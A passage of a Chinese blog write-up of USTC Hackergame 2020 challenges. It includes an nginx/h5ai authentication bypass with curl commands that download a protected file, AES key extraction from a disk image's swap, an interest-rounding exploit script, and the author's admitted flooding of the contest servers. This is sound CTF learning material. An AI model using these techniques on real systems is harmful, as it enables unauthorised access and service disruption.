小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>\"Send from Arctic.\" 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊......话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>......</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There's no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/20.png\" width=\"829\" height=\"601\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.0/32.png\" width=\"1067\" height=\"247\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/6.png\" width=\"1009\" height=\"593\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/7.png\" width=\"988\" height=\"581\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/13.png\" width=\"782\" height=\"905\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/15.png\" width=\"690\" height=\"94\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-title class_\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">'credit'|'debit'</span>} <span class=\"hljs-variable\">type</span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) {    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">from</span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">to</span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">amount</span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) {    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">account</span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) {    <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">createCard</span>(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">createCard</span>(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">transfer</span>(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">eatAndEndTheDay</span>(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.<span class=\"hljs-title function_\">json</span>();    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(resp.<span class=\"hljs-property\">flag</span>);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>......<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.8/29.png\" width=\"1497\" height=\"412\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完.....吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/27.png\" width=\"1150\" height=\"420\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/28.png\" width=\"1146\" height=\"539\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏......」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/18.png\" width=\"824\" height=\"864\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>...... 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 ... 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 ... 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-section\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-section\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-section\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  <span class=\"hljs-variable\">$document_root</span><span class=\"hljs-variable\">$fastcgi_script_name</span>;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ <span class=\"hljs-built_in\">cat</span> flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/9.png\" width=\"1165\" height=\"294\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/8.png\" width=\"750\" height=\"400\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/10.png\" width=\"1196\" height=\"270\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/11.png\" width=\"687\" height=\"514\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/12.png\" width=\"1371\" height=\"279\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.9/31.png\" width=\"1109\" height=\"135\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 